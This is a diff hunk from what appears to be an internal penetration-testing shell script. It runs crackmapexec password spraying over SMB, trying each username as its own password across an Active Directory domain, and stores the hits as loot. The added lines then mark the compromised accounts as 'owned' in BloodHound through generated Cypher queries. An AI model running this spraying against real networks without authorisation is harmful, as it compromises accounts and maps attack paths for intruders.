@@ -171,6 +171,10 @@ then
    crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >> /root/output/loot/intern/ad/iam/username_as_pass/raw_$DOM.txt
    grep '+' /root/output/loot/intern/ad/iam/username_as_pass/raw_$DOM.txt > /root/output/loot/intern/ad/iam/username_as_pass/user_$DOM.txt
  # keep the raw file for screens and debugging
+   # BH owned User
+   BHDOM=$(tr [:lower:] [:upper:] <<< $DOM)
+   awk '/\+/ {print$6}' /root/output/loot/intern/ad/iam/username_as_pass/user_$DOM.txt | cut -d : -f 2 | sort -u | tr [:lower:] [:upper:] > /root/output/loot/intern/ad/iam/username_as_pass/owneduser.txt
+   for i in $(cat /root/output/loot/intern/ad/iam/username_as_pass/owneduser.txt); do echo "MATCH (n) WHERE n.name = '$i@$BHDOM' SET n.owned=true RETURN n;" >> /root/output/loot/intern/ad/iam/username_as_pass/bh_owned.txt ; done
 
   echo "Pass-Pol" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
